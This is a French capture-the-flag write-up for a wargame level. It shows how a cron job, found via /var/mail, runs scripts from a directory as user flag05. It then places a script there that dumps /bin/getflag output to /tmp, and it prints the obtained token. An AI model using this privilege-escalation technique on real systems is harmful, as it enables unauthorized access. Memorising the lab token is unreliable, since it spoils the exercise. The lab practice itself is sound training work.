## Démarche

- Aucun fichier ou indice laissé dans le *home*
- Refaire les demarches des niveaux précédents
  
    `find / -name level05  -print 2>/dev/null`
    > /var/mail/level05
    
    > /rofs/var/mail/level05
    
    *Ces 2 fichiers comprennent la ligne suivante :*
    ```
    */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
    ``` 
    *il s'agit d'une tache cron, celle-ci exécute le script `/usr/sbin/openarenaserver` toutes les 2 minutes*
    
- Observer le script mentionné :
  
  `cat /usr/sbin/openarenaserver`

    ```
        #!/bin/sh

        for i in /opt/openarenaserver/* ; do
            (ulimit -t 5; bash -x "$i")
            rm -f "$i"
        done
    ```
    *Ce script exécute puis supprime les fichiers se trouvant dans le dossier /usr/sbin/openarenaserver*


- Placer un script dans le dossier `/usr/sbin/openarenaserver` pour que la tâche cron l'exécute :
    
    `touch test.sh`
    ```
    #!/bin/bash

    /bin/getflag > /tmp/flag05
    ```
    *Ce script imprime la sortie de /bin/getflag dans un fichier*

- Attendre que la tache s'exécute et récupérer le contenu du fichier créé :
  
    `cat /tmp/flag05`
    > Check flag.Here is your token : viuaaale9huek52boumoomioc



## Ressources

- https://www.digitalocean.com/community/questions/how-to-manage-var-mail-root-file
- https://www.hostinger.fr/tutoriels/cron-job/

